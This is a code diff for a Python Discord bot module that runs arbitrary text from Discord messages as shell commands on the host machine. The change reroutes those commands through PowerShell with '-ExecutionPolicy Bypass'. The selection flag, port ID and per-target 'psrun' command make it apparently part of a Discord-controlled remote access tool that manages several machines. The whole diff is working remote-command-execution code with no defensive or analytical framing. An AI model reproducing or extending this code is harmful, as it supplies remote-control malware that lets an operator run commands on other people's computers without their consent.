@@ -5,20 +5,20 @@ import asyncio
 import discord
 from discord.ext import commands
 
-class Cmd(commands.Cog):
+class PowerShell(commands.Cog):
     def __init__(self, app: commands.Bot):
         self.bot = app
 
-    @commands.command(name="cmd", aliases=["exec", "command"])
-    async def cmd_exec(self, ctx, *, command: str):
+    @commands.command(name="powershell", aliases=["ps", "posh"])
+    async def ps_exec(self, ctx, *, command: str):
 
         if not getattr(self.bot, 'is_selected', False):
             return
         
         await self.execute_logic(ctx, command)
 
-    @commands.command(name="run", aliases=["direct"])
-    async def run_direct(self, ctx, target_id: str, *, command: str):
+    @commands.command(name="psrun", aliases=["psdirect"])
+    async def run_psdirect(self, ctx, target_id: str, *, command: str):
         my_id = getattr(self.bot, 'port_id', 'Unknown')
 
         if not getattr(self.bot, 'is_selected', False):
@@ -57,8 +57,9 @@ class Cmd(commands.Cog):
         
         async with ctx.typing():
             try:
+                ps_cmd = f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{command}"'
                 proc = await asyncio.create_subprocess_shell(
-                    command,
+                    ps_cmd,
                     stdout=asyncio.subprocess.PIPE,
                     stderr=asyncio.subprocess.PIPE
                 )
@@ -87,4 +88,4 @@ class Cmd(commands.Cog):
                 await ctx.send(f"Error: {e}")
 
 async def setup(app: commands.Bot):
-    await app.add_cog(Cmd(app))
+    await app.add_cog(PowerShell(app))
